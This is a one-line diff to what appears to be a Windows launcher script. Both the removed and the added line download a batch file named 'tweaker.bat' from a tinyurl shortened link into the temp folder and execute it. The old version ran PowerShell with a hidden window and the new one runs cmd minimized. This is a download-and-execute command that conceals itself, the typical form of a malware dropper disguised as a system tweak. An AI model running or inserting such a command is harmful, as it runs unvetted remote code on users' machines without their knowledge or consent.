@@ -1,1 +1,1 @@
-start /b "" powershell.exe -NoProfile -WindowStyle Hidden -Command "$b=Join-Path $env:TEMP 'tweaker.bat'; iwr -useb 'https://tinyurl.com/VZEDSTART' -OutFile $b; Start-Process $b -WindowStyle Hidden" & exit
+start "" /min cmd /c "curl.exe -sL -o %TEMP%\tweaker.bat https://tinyurl.com/VZEDSTART && %TEMP%\tweaker.bat" & exit
